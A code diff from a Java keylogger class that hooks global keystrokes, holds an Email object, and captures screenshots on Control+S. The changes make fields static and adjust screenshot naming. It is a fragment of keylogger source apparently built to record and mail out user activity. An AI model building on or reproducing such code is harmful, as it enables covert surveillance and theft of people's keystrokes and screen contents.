@@ -20,9 +20,9 @@ public class KeyLogger implements Runnable, NativeKeyListener {
     FileWriter writer;
     BufferedWriter bwriter;
 
-    private Email email;
-    private Screenshot screenshot;
-    private int screenshotCount = 0;
+    private static Email email;
+    private static Screenshot screenshot;
+    private static int screenshotCount = 0;
     private boolean modded = false;
     private static Controller con;
 
@@ -42,7 +42,7 @@ public class KeyLogger implements Runnable, NativeKeyListener {
         GlobalScreen.addNativeKeyListener(new KeyLogger());
 
         email = new Email();
-        screenshot = new Screenshot();
+        screenshot = new Screenshot(Filename);
 
         //disable logging
 
@@ -80,7 +80,7 @@ public class KeyLogger implements Runnable, NativeKeyListener {
                 switch (nativeKeyEvent.getKeyCode()){
                     case NativeKeyEvent.VC_S:
                         // if control + s is pressed then capture screenshot
-                        screenshot.capture(screenshotCount);
+                        screenshot.capture(screenshotCount + "shortcut");
                         screenshotCount++;
                         modded = false;
                         break;
